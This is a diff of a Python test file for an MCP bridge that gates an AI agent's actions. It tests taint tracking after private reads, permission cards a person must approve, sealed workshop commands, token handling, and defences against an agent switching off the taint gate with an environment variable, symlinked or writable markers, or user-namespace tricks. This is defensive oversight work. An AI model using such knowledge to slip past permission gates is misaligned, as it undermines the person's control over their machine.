+    module.TAINT_OFF = True
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    module.run_tool(module.BY_NAME["web_go"], {"url": TAHOE})
+    check("on a machine that declares it, nobody is asked", not read(state).get("requests"), read(state))
 
     # 25d. The card shows what the browser will be sent (security review of #1065, M1 and L1): one
     # ASCII form, made by `wire_address`, that is asked about, bound and opened.
@@ -3353,6 +3647,64 @@ with tempfile.TemporaryDirectory() as d:
     check("carries_private itself asks for a visited address that carries a query, and not for a bare one",
           module.carries_private("browser", "go", False, {"args": {"url": TAHOE + "?d=1"}})
           and not module.carries_private("browser", "go", False, {"args": {"url": TAHOE}}), None)
+
+    # 25g. The sealed workshop (#1120). The tainted conversation above has read private state. A
+    # command is outward and asks; the sealed form is a different action the shell checks against its
+    # own grant record, and it asks nothing. What a caller CLAIMS changes neither: an `agent_run`
+    # that names a workshop is still `agent_run`, and the command tools send the shell no claim.
+    sealed_args = {"command": "npm run build", "workshop": "/home/x/Documents/w"}
+    check("tainted: agent_run asks", bool(module.carries_private("shell", "agent_run", True, {"args": sealed_args})), None)
+    check("tainted: agent_run asks even when it claims a workshop and says nothing of running anything",
+          bool(module.carries_private("shell", "agent_run", False, {"args": sealed_args})), None)
+    check("tainted: the sealed form is not outward, so it is not asked about",
+          module.carries_private("shell", "agent_run_sealed", False, {"args": sealed_args}) == "", None)
+    check("the sealed action is in no list of outward actions",
+          ("shell", "agent_run_sealed") not in module.COMMANDS and ("shell", "agent_run_sealed") not in module.HANDOFFS, None)
+    check("run_command cannot claim a workshop: the argument is not sent",
+          "workshop" not in module.agent_args("run_command", dict(sealed_args)), module.agent_args("run_command", dict(sealed_args)))
+    check("run_sealed_command sends the shell the name of the folder and the shell alone decides",
+          module.agent_args("run_sealed_command", dict(sealed_args)) == sealed_args,
+          module.agent_args("run_sealed_command", dict(sealed_args)))
+    check("the sealed tool and its grant are offered, and waiting on a sealed command is a long wait",
+          "run_sealed_command" in module.AGENT_BY_NAME and module.AGENT_BY_NAME["workshop_request"]["agent_action"] == "workshop_create"
+          and "agent_run_sealed" in module.AGENT_WAITING, None)
+
+    # 25h. A workshop grant is the person's to allow, in every mode (#1124, H1). The action's own
+    # sentence declares it; the bridge asks, tells the shell (`tainted`), and a shell that would
+    # answer `not_needed` is a refusal, never a go-ahead. A session rule changes nothing.
+    for mode in ("ask", "auto", "bypass", "bypass_all"):
+        module, state = case(tmp, "workshop-card-%s" % mode, mode=mode, machine_ceiling="dangerous",
+                             ceiling=None, not_needed=True, rules=[{"app": "shell", "action": "workshop_create"}])
+        text, is_error = act(module, "shell", "workshop_create", {"name": "x"})
+        s = read(state)
+        check("workshop_request raises a card in %s even with a session rule, and runs only on the grant" % mode,
+              len(s.get("requests", [])) == 1 and s["requests"][0].get("tainted") is True
+              and s["requests"][0]["action"] == "workshop_create"
+              and all(a.get("grant") for a in s.get("acted", []) if a["action"] == "workshop_create"),
+              (text, s.get("requests"), s.get("acted")))
+    module, state = case(tmp, "workshop-card-granted", mode="bypass_all", machine_ceiling="dangerous", ceiling=None)
+    text, is_error = act(module, "shell", "workshop_create", {"name": "x"})
+    s = read(state)
+    check("and once the person allows it, it runs with their grant",
+          len(s.get("requests", [])) == 1 and [a["action"] for a in s.get("acted", [])] == ["workshop_create"], (text, s))
+    rust = (HERE.parent.parent / "crates/yantrik-ipc-contracts/src/control_surface.rs").read_text(encoding="utf-8")
+    sentence = re.search(r'pub const ALWAYS_ASKS: &str = "(.*?)";', rust)
+    check("the bridge's always-asked sentence is the gate's, word for word",
+          sentence is not None and sentence.group(1) == module.ALWAYS_ASKS and module.always_asks("x. " + module.ALWAYS_ASKS.upper())
+          and not module.always_asks("The person allows it."), sentence.group(1) if sentence else "no ALWAYS_ASKS")
+
+    # 25i. The tool text for the sealed command says what it cannot do.
+    check("the tool text says there is no network mode",
+          "NO network mode" in module.AGENT_BY_NAME["run_sealed_command"]["description"], None)
+    check("the tool text names what a job reaches on loopback",
+          all(w in module.AGENT_BY_NAME["run_sealed_command"]["description"] for w in ("7450", "7460", "11434")), None)
+    check("the tool text names that a job can change the person's startup files",
+          all(w in " ".join(module.AGENT_BY_NAME["run_sealed_command"]["description"].split())
+              for w in ("runs as the person's account", "startup files included", "#1137 step 3")), None)
+
+    check("run_command, the tool that runs agent_run, says the same: loopback and startup files",
+          all(w in " ".join(module.AGENT_BY_NAME["run_command"]["description"].split())
+              for w in ("7450", "7460", "11434", "runs as the person's account", "startup files included", "#1137 step 3")), None)
 
     # 26. What os_apps offers a mind to describe answers describe. The first live catalog run's
     # Red team read `harness` off the services line, called os_describe on it and spent a failed
@@ -3727,6 +4079,198 @@ pairs = module.act_pairs({"app": "notes", "action": "new_note",
                           "args": '{"title": "Weekend packing list", "text": "Essentials\n- ID\n- Charger"}'})
 check("JSON text with raw newlines in its strings is read as the object it is",
       pairs == ["title=Weekend packing list", "text=Essentials\n- ID\n- Charger"], pairs)
+
+# ── The token reaches the bridge without staying in its environment (#411) ──────────────
+# A harness's runtime may start the bridge itself and pass it only an environment (Hermes starts its
+# MCP servers), so the bridge can be told where to fetch the token (a socket) or be handed it
+# (a pipe), and either way reads it once, drops the variables and makes itself non-dumpable.
+import socket as _socket
+import subprocess
+import threading as _threading
+from importlib.machinery import SourceFileLoader as _Loader
+
+TOKEN_IN = "fedcba9876543210fedcba9876543210"
+PROBE = r"""
+import ctypes, importlib.util, os, sys
+from importlib.machinery import SourceFileLoader
+loader = SourceFileLoader("probe", sys.argv[1])
+spec = importlib.util.spec_from_loader("probe", loader)
+module = importlib.util.module_from_spec(spec)
+loader.exec_module(module)
+print(len(module.AGENT_TOKEN), module.AGENT_TOKEN == sys.argv[2],
+      ctypes.CDLL(None).prctl(3, 0, 0, 0, 0),
+      sorted(k for k in os.environ if k.startswith("YANTRIK_AGENT_TOKEN")))
+"""
+
+def probe(extra_env, pass_fds=()):
+    env = {k: v for k, v in os.environ.items() if not k.startswith("YANTRIK_AGENT_TOKEN")}
+    env.update(extra_env)
+    done = subprocess.run([sys.executable, "-c", PROBE, str(SOURCE), TOKEN_IN], capture_output=True, text=True,
+                          env=env, pass_fds=pass_fds, timeout=30)
+    return done.stdout.strip(), done.stderr.strip()
+
+read_end, write_end = os.pipe()
+os.write(write_end, TOKEN_IN.encode()); os.close(write_end)
+out, err = probe({"YANTRIK_AGENT_TOKEN_FD": str(read_end)}, (read_end,))
+os.close(read_end)
+check("a token handed over a pipe is read, the variable dropped, the process non-dumpable",
+      out.startswith("32 True 0 []"), (out, err))
+
+with tempfile.TemporaryDirectory() as sd:
+    path = os.path.join(sd, "t.sock")
+    server = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
+    server.bind(path); server.listen(2)
+    def serve():
+        for _ in range(2):
+            try:
+                conn, _addr = server.accept()
+            except OSError:
+                return
+            conn.sendall(TOKEN_IN.encode()); conn.close()
+    _threading.Thread(target=serve, daemon=True).start()
+    out, err = probe({"YANTRIK_AGENT_TOKEN_SOCK": path})
+    check("a token fetched from the socket a harness named is read the same way, the process left dumpable (a hidepid /proc would unlist it)",
+          out.startswith("32 True 1 []"), (out, err))
+    out, err = probe({"YANTRIK_AGENT_TOKEN_SOCK": path, "YANTRIK_AGENT_TOKEN": "x" * 32})
+    check("and the socket wins over a plain variable, which is dropped too", out.startswith("32 True 1 []"), (out, err))
+    server.close()
+    out, err = probe({"YANTRIK_AGENT_TOKEN_SOCK": os.path.join(sd, "nobody-home.sock")})
+    check("a named source that cannot be read gives no token, never a guess", out.startswith("0 False"), (out, err))
+# The harness's runtime starts the bridge before the harness has attached, and the token changes at
+# every attach: a bridge told to ask on a socket asks again, before it lists tools and before a call.
+PROBE_AGAIN = PROBE.split("print(")[0] + """
+seen = [module.AGENT_TOKEN]
+for _ in range(3):
+    module.refresh_agent_token()
+    seen.append(module.AGENT_TOKEN)
+import json
+print(json.dumps(["T" if t == sys.argv[2] else t for t in seen]), ctypes.CDLL(None).prctl(3, 0, 0, 0, 0))
+"""
+with tempfile.TemporaryDirectory() as sd:
+    path = os.path.join(sd, "again.sock")
+    server = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
+    server.bind(path); server.listen(8)
+    answers = ["", TOKEN_IN, "", ""]
+    def serve_again():
+        for answer in answers:
+            try:
+                conn, _addr = server.accept()
+            except OSError:
+                return
+            conn.sendall(answer.encode()); conn.close()
+    _threading.Thread(target=serve_again, daemon=True).start()
+    env = {k: v for k, v in os.environ.items() if not k.startswith("YANTRIK_AGENT_TOKEN")}
+    env["YANTRIK_AGENT_TOKEN_SOCK"] = path
+    done = subprocess.run([sys.executable, "-c", PROBE_AGAIN, str(SOURCE), TOKEN_IN], capture_output=True, text=True,
+                          env=env, timeout=30)
+    server.close()
+    check("a socket that has no token at start is asked again: none, then the live one, then none again",
+          done.stdout.strip() == '["", "T", "", ""] 1',
+          (done.stdout, done.stderr[-300:]))
+out, err = probe({"YANTRIK_AGENT_TOKEN": TOKEN_IN})
+check("the plain variable still works, and is dropped and the process made non-dumpable",
+      out.startswith("32 True 0 []"), (out, err))
+out, err = probe({})
+check("no token, no change: the process stays as it was", out.startswith("0 False 1 []"), (out, err))
+
+# -- YOS_MCP_NO_TAINT is honoured only on a machine that declares it --------------------------------
+# `taint_off_declared(environ, marker, root)`: `root` stands for uid 0, which a test is not.
+with tempfile.TemporaryDirectory() as _d:
+    _d = pathlib.Path(_d)
+    tmp = _d
+    (_d / "yos").write_text(FAKE_YOS, encoding="utf-8")
+    (_d / "yos").chmod(0o755)
+    _me = os.getuid() if hasattr(os, "getuid") else None
+    module_for_proc = None
+    _ident = _d / "uid_map_identity"
+    _ident.write_text("         0          0 4294967295\n")
+    _userns = _d / "uid_map_userns"
+    _userns.write_text("         0       1000          1\n")
+    _scratch = tmp / "taint-marker.json"
+    _scratch.write_text("{}", encoding="utf-8")
+    _mod = load_mcp(tmp / "yos", _scratch)
+    module_for_proc = _mod
+    ON = {"YOS_MCP_NO_TAINT": "1"}
+
+    def _marker(name, mode=0o644, directory_mode=0o755):
+        d = _d / name
+        d.mkdir()
+        os.chmod(d, directory_mode)
+        m = d / "no-person-data"
+        m.write_text("declared\n")
+        os.chmod(m, mode)
+        return str(m)
+
+    if _me is not None:
+        m = _marker("good")
+        check("the variable with a valid marker turns the taint off",
+              _mod.taint_off_declared(ON, m, _me, str(_ident)) is True)
+        check("the marker without the variable does nothing",
+              _mod.taint_off_declared({}, m, _me, str(_ident)) is False
+              and _mod.taint_off_declared({"YOS_MCP_NO_TAINT": "0"}, m, _me, str(_ident)) is False)
+        check("the variable without a marker leaves the taint on",
+              _mod.taint_off_declared(ON, str(_d / "good" / "absent"), _me, str(_ident)) is False)
+        check("inside a user namespace (a uid map that is not the identity) a valid marker is ignored",
+              _mod.taint_off_declared(ON, m, _me, str(_userns)) is False
+              and _mod.taint_off_declared(ON, m, _me, str(_d / "no-such-uid-map")) is False)
+        check("a uid map that is not the kernel's procfs (a file mounted over it) is not trusted",
+              module_for_proc.on_procfs("/proc/self/uid_map") is True and module_for_proc.on_procfs(str(_ident)) is False
+              and module_for_proc.on_procfs(str(_d / "nowhere")) is False, "")
+        check("a marker owned by another uid is ignored", _mod.taint_off_declared(ON, m, _me + 1, str(_ident)) is False)
+        check("a group-writable marker is ignored", _mod.taint_off_declared(ON, _marker("gw", 0o664), _me, str(_ident)) is False)
+        check("a world-writable marker is ignored", _mod.taint_off_declared(ON, _marker("ww", 0o646), _me, str(_ident)) is False)
+        check("a marker in a group-writable directory is ignored",
+              _mod.taint_off_declared(ON, _marker("gdir", 0o644, 0o775), _me, str(_ident)) is False)
+        check("a marker in a world-writable directory is ignored",
+              _mod.taint_off_declared(ON, _marker("wdir", 0o644, 0o777), _me, str(_ident)) is False)
+        _real = pathlib.Path(_marker("target"))
+        (_d / "link").mkdir()
+        os.symlink(_real, _d / "link" / "no-person-data")
+        check("a symlink to a valid marker is not the marker",
+              _mod.taint_off_declared(ON, str(_d / "link" / "no-person-data"), _me, str(_ident)) is False)
+        os.symlink(_d / "good", _d / "dirlink")
+        check("a symlinked directory is not the marker's directory",
+              _mod.taint_off_declared(ON, str(_d / "dirlink" / "no-person-data"), _me, str(_ident)) is False)
+        (_d / "asdir" / "no-person-data").mkdir(parents=True)
+        check("a directory in the marker's place is ignored",
+              _mod.taint_off_declared(ON, str(_d / "asdir" / "no-person-data"), _me, str(_ident)) is False)
+    check("the real marker is /etc/yantrik/no-person-data, and with none there the default is taint ON",
+          _mod.TAINT_MARKER == "/etc/yantrik/no-person-data"
+          and (_mod.taint_off_declared(ON) is False or os.path.exists(_mod.TAINT_MARKER)))
+    # End to end: a mind that sets the variable on a machine without the marker gains nothing.
+    if not os.path.exists("/etc/yantrik/no-person-data"):
+        os.environ["YOS_MCP_NO_TAINT"] = "1"
+        try:
+            module, state = case(tmp, "var-without-marker", mode="auto", ceiling=None, token=TOKEN,
+                                 rules=RULED)
+        finally:
+            os.environ.pop("YOS_MCP_NO_TAINT", None)
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+        module.call_tool(module.AGENT_BY_NAME["run_command"], {"command": "ls /"})
+        check("with the variable set and no marker, a tainted command still asks",
+              module.TAINT_OFF is False and [r.get("action") for r in read(state).get("requests", [])]
+              == ["agent_run"], read(state).get("requests"))
+
+# -- Saying how to look without tainting, and the line for an exact action name ---------------------
+_text = " ".join(_mod.BY_NAME["os_describe"]["description"].split())
+check("os_describe names the free path, with the family word, as a prefix and not an exact name",
+      "without reading state, pass `actions` with the family word (`agent_`" in _text
+      and "not an exact action name" in _text, _text)
+_yos_loader = SourceFileLoader("yos_nofamily", str(HERE / "yos"))
+_yos = importlib.util.module_from_spec(importlib.util.spec_from_loader("yos_nofamily", _yos_loader))
+_yos_loader.exec_module(_yos)
+_acts = [{"name": n, "grade": "safe", "purpose": "x", "params": []} for n in
+         ("agent_run", "agent_job", "agent_input", "agent_stop", "files_open", "files_move", "files_copy",
+          "files_delete", "lock", "open_app", "show_app", "hide_app", "quit_app", "set_mode", "unlock")]
+_out = _yos.render_folded("shell", _acts, expand="agent_run")
+check("an exact action name is told it is not a family, and which word is",
+      "`agent_run` is one action of shell, not a family" in _out and "`agent_`" in _out
+      and "starts with" not in _out, _out)
+_out = _yos.render_folded("shell", _acts, expand="nonsense")
+check("a word that matches nothing lists the family words there are",
+      "no family of shell is named `nonsense`" in _out and "agent_, files_" in _out, _out)
+_out = _yos.render_folded("shell", _acts, expand="agent_")
+check("a family word still prints that family", "no family" not in _out and "agent_run" in _out, _out)
 
 print()
 if failures:
